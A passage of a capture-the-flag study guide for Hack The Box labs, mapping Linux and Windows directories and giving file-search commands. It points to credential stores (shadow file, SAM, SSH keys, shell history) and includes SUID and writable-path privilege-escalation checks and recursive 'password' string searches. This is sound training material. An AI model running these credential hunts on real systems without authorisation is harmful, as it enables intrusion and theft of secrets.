| `/dev` | Device files. Everything is a file in Linux — disks, terminals, `/dev/null`, `/dev/random`. |
| `/proc` | Virtual filesystem — live info about running processes and the kernel. `/proc/1/` is PID 1. `/proc/net/` has network info. |
| `/sys` | Virtual filesystem for kernel and hardware info. Less useful in CTFs but good to know. |
| `/mnt` | Mount point for manually mounted drives. In WSL, your Windows drives are at `/mnt/c/`, `/mnt/d/`, etc. |
| `/media` | Mount point for removable media (USB drives, CD-ROMs). Rarely relevant on servers. |
| `/srv` | Data served by the system — FTP, HTTP, etc. Check if the box is running a web or file server. |
| `/run` | Runtime data since last boot. PIDs, sockets, locks. |
| `/boot` | Bootloader and kernel files. Usually not interesting unless you're doing kernel work. |

### The HTB-Relevant Ones

These are the directories you'll actually care about on a box:

```
/etc/passwd          — list of all users (readable by everyone)
/etc/shadow          — hashed passwords (root only — if you can read this, you're basically done)
/etc/crontab         — scheduled tasks (privesc vector)
/etc/sudoers         — who can run what as sudo (privesc vector)
/etc/hosts           — local DNS entries (useful for pivoting)
/etc/ssh/            — SSH config and sometimes keys
/var/log/            — logs — auth.log, syslog, apache/nginx access logs
/var/www/html/       — default web root for Apache/Nginx
/var/mail/           — user mailboxes (sometimes has creds or flags)
/tmp/ and /dev/shm/  — writable by everyone, good for dropping files
/opt/                — custom software, often misconfigured
/home/*/.ssh/        — SSH keys, authorized_keys
/home/*/.bash_history — command history (people type passwords by accident all the time)
/root/.ssh/          — root's SSH keys
/root/.bash_history  — root's command history
```

### File Permissions Quick Reference

```
-rwxr-xr-x  1 root root  → owner: read/write/execute | group: read/execute | others: read/execute
drwxrwxrwt  → d = directory, t = sticky bit (only owner can delete files inside — like /tmp)
-rwsr-xr-x  → s = SUID bit (runs as file owner, not the user running it — huge privesc vector)
```

```bash
# Find SUID binaries (classic privesc check)
find / -perm -4000 -type f 2>/dev/null

# Find world-writable directories
find / -writable -type d 2>/dev/null

# Find files owned by root that are writable
find / -user root -writable 2>/dev/null | grep -v proc
```

### How to Find a File on Linux

```bash
# Find by name (searches the whole filesystem)
find / -name "filename.txt" 2>/dev/null

# Find by name, case-insensitive
find / -iname "filename.txt" 2>/dev/null

# Find only in a specific directory
find /home -name "*.conf" 2>/dev/null

# Find by extension
find / -name "*.log" 2>/dev/null

# Find files modified in the last 10 minutes (useful after you drop something)
find / -mmin -10 -type f 2>/dev/null

# Locate (faster but uses a cached index — may be outdated)
locate filename.txt
updatedb  # refresh the index (run as root)

# Find where a command lives
which python3
which bash

# Find all versions of a command in PATH
whereis python
```

> `2>/dev/null` silences "Permission denied" errors so you only see results you can actually access.

---

## Windows Filesystem Reference

Windows doesn't have one root `/` — it has drive letters (`C:\`, `D:\`, etc.). `C:\` is almost always the system drive.

### The Full Map

| Path | What it's for |
|------|---------------|
| `C:\` | System drive root. Everything important lives here. |
| `C:\Windows\` | The OS itself. System files, DLLs, drivers. |
| `C:\Windows\System32\` | Core system executables and libraries. Where most built-in tools live (`cmd.exe`, `powershell.exe`, etc.). |
| `C:\Windows\SysWOW64\` | 32-bit versions of System32 libraries on 64-bit systems. |
| `C:\Windows\Temp\` | System temp files. World-writable, good for dropping payloads. |
| `C:\Program Files\` | Installed 64-bit applications. |
| `C:\Program Files (x86)\` | Installed 32-bit applications. |
| `C:\Users\` | Home directories for all users — one folder per user. |
| `C:\Users\username\Desktop\` | User's desktop. Flags often land here on HTB. |
| `C:\Users\username\Documents\` | User documents. Worth checking for creds and notes. |
| `C:\Users\username\AppData\` | Hidden folder with app data. Three subfolders: `Local`, `LocalLow`, `Roaming`. Config files, saved sessions, sometimes creds. |
| `C:\Users\Public\` | Shared between all users. No special permissions needed. |
| `C:\Users\Administrator\` | Admin home. Check Desktop for root flag on HTB. |
| `C:\ProgramData\` | App data shared across users (hidden by default). Often has config files with creds. |
| `C:\Temp\` | Sometimes exists as an extra temp directory. Worth checking. |

### The HTB-Relevant Ones

```
C:\Users\*\Desktop\             — flags, shortcuts, sometimes sensitive files
C:\Users\*\AppData\Roaming\     — browser data, saved sessions, app configs
C:\Users\*\AppData\Local\Temp\  — temp files, sometimes dropped payloads
C:\Windows\System32\config\     — SAM database (password hashes) — locked while Windows runs
C:\Windows\Temp\                — world-writable, good for staging
C:\inetpub\wwwroot\             — IIS web root (like /var/www/html on Linux)
C:\xampp\htdocs\                — XAMPP web root if the box runs XAMPP
C:\ProgramData\                 — app configs, sometimes unattended install files with creds
C:\unattend.xml                 — leftover from Windows installs, sometimes has plaintext creds
C:\Windows\System32\drivers\etc\hosts — Windows hosts file (same as /etc/hosts on Linux)
```

### How to Find a File on Windows

```cmd
:: CMD — search from C:\ root
dir /s /b C:\filename.txt

:: Search by extension
dir /s /b C:\*.config

:: Find files containing a string (like grep)
findstr /s /i "password" C:\*.txt
findstr /s /i "password" C:\*.xml
findstr /s /i "password" C:\*.config
```

```powershell
# PowerShell — more powerful
Get-ChildItem -Path C:\ -Recurse -Filter "filename.txt" -ErrorAction SilentlyContinue

# Search file contents for a string
Select-String -Path "C:\*.txt" -Pattern "password" -Recurse

# Find recently modified files
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-10) }
```
